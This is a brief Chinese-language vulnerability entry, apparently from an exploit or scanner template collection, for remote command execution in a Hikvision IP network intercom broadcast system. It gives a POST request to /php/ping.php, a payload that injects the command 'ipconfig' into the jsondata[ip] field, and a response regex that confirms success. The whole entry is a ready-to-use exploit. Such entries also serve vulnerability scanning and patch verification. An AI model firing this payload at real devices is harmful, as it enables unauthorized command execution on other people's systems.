# 海康威视IP网络对讲广播系统远程命令执行

海康 ｜ 命令执行 ｜ —
- **请求**：`POST /php/ping.php HTTP/1.1`

**Payload**
```
jsondata[type]=3&jsondata[ip]=ipconfig
```
- **响应特征**：200 ^(?=.*?IP)(?=.*?Address).*?$